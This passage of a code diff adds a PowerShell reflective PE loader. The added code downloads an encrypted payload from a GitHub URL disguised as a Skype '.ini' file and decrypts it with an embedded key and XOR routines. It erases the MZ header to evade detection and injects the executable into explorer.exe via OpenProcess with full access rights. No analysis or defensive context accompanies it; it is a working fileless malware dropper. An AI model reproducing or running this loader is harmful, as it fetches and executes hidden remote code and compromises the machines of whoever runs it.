+
+			[IntPtr]$MemAddrBase = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$BaseRelocationTable.VirtualAddress))
+			$NumRelocations = ($BaseRelocationTable.SizeOfBlock - $ImageBaseRelocSize) / 2
+
+			for($i = 0; $i -lt $NumRelocations; $i++)
+			{
+				$RelocationInfoPtr = [IntPtr](Add-SignedIntAsUnsigned ([IntPtr]$BaseRelocPtr) ([Int64]$ImageBaseRelocSize + (2 * $i)))
+				[UInt16]$RelocationInfo = [System.Runtime.InteropServices.Marshal]::PtrToStructure($RelocationInfoPtr, [Type][UInt16])
+
+				[UInt16]$RelocOffset = $RelocationInfo -band 0x0FFF
+				[UInt16]$RelocType = $RelocationInfo -band 0xF000
+				for ($j = 0; $j -lt 12; $j++)
+				{
+					$RelocType = [Math]::Floor($RelocType / 2)
+				}
+				if (($RelocType -eq $Win32Constants.IMAGE_REL_BASED_HIGHLOW) `
+						-or ($RelocType -eq $Win32Constants.IMAGE_REL_BASED_DIR64))
+				{			
+					[IntPtr]$FinalAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$MemAddrBase) ([Int64]$RelocOffset))
+					[IntPtr]$CurrAddr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FinalAddr, [Type][IntPtr])
+		
+					if ($AddDifference -eq $true)
+					{
+						[IntPtr]$CurrAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$CurrAddr) ($BaseDifference))
+					}
+					else
+					{
+						[IntPtr]$CurrAddr = [IntPtr](Sub-SignedIntAsUnsigned ([Int64]$CurrAddr) ($BaseDifference))
+					}				
+
+					[System.Runtime.InteropServices.Marshal]::StructureToPtr($CurrAddr, $FinalAddr, $false) | Out-Null
+				}
+				elseif ($RelocType -ne $Win32Constants.IMAGE_REL_BASED_ABSOLUTE)
+				{
+					return
+				}
+			}
+			
+			$BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$BaseRelocPtr) ([Int64]$BaseRelocationTable.SizeOfBlock))
+		}
+	}
+
+    Function Copy-Sections
+	{
+		Param(
+		[Parameter(Position = 0, Mandatory = $true)]
+		[Byte[]]
+		$PEBytes,
+		
+		[Parameter(Position = 1, Mandatory = $true)]
+		[System.Object]
+		$PEInfo,
+		
+		[Parameter(Position = 2, Mandatory = $true)]
+		[System.Object]
+		$Win32Functions,
+		
+		[Parameter(Position = 3, Mandatory = $true)]
+		[System.Object]
+		$Win32Types
+		)
+		
+		for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
+		{
+			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
+			$SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)
+		
+			[IntPtr]$SectionDestAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$SectionHeader.VirtualAddress))
+			
+			$SizeOfRawData = $SectionHeader.SizeOfRawData
+
+			if ($SectionHeader.PointerToRawData -eq 0)
+			{
+				$SizeOfRawData = 0
+			}
+			
+			if ($SizeOfRawData -gt $SectionHeader.VirtualSize)
+			{
+				$SizeOfRawData = $SectionHeader.VirtualSize
+			}
+			
+			if ($SizeOfRawData -gt 0)
+			{
+				[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, [Int32]$SectionHeader.PointerToRawData, $SectionDestAddr, $SizeOfRawData)
+			}
+		
+			if ($SectionHeader.SizeOfRawData -lt $SectionHeader.VirtualSize)
+			{
+				$Difference = $SectionHeader.VirtualSize - $SizeOfRawData
+				[IntPtr]$StartAddress = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$SectionDestAddr) ([Int64]$SizeOfRawData))
+				$Win32Functions.memset.Invoke($StartAddress, 0, [IntPtr]$Difference) | Out-Null
+			}
+		}
+	}	
+Function Main
+	{
+		$Win32Functions = Get-Win32Functions
+		$Win32Constants =  Get-Win32Constants
+		
+		$RemoteProcHandle = [IntPtr]::Zero
+	    
+        
+		if (($HostPID -eq $null) -or ($HostPID -eq 0))
+		{
+			$Processes = @(Get-Process -Name explorer -ErrorAction SilentlyContinue)
+            $HostPID = $Processes[0].ID
+		}
+
+        $RemoteProcHandle = $Win32Functions.OpenProcess.Invoke(0x001F0FFF, $false, $HostPID)
+		$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -RemoteProcHandle $RemoteProcHandle
+	}
+
+	Main
+}
+
+# $Processes = @(Get-Process -Name CompPkgSrv -ErrorAction SilentlyContinue)
+# $HostPID = $PID
+
+$PEUrl = "https://raw.githubusercontent.com/banyul356op/reloading/refs/heads/main/skype.ini"
+$KeyString = "3fj9s8djc3m4wfvsdkmsd8w2kascv0dfvijodfvjo209jsocmsoidhgnocskcmkl"
+$Key = [System.Text.Encoding]::UTF8.GetBytes($KeyString)
+$WebClient = New-Object System.Net.WebClient
+		
+[Byte[]]$Buffer = $WebClient.DownloadData($PEUrl)
+
+
+$BufferSize = $Buffer.Length
+$SecKey =  [byte[]]::new(8)
+$PEBytes  = [byte[]]::new($BufferSize)
+[System.Array]::Copy($Buffer, 0, $SecKey, 0, 8) | Out-Null
+
+for($i = 8; $i -lt $BufferSize; $i++ )
+{
+    $Buffer[$i] = $Buffer[$i] -bxor $SecKey[$i % 8]
+}
+   
+for($i = 0; $i -lt $BufferSize; $i++ )
+{
+    $Buffer[$i] = $Buffer[$i] -bxor [Byte]$Key[$i % $Key.Length]
+}
+[System.Array]::Copy($Buffer, $BufferSize/2, $PEBytes, 0, $BufferSize/2) | Out-Null
+[System.Array]::Copy($Buffer, 0, $PEBytes,  $BufferSize/2, $BufferSize/2) | Out-Null
+
+
+
+$e_magic = ($PEBytes[0..1] | % {[Char] $_}) -join ''
+
+if ($e_magic -ne 'MZ')
+{
+    return
+}
+
+$PEBytes[0] = 0
+$PEBytes[1] = 0
+
+Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes, 0)
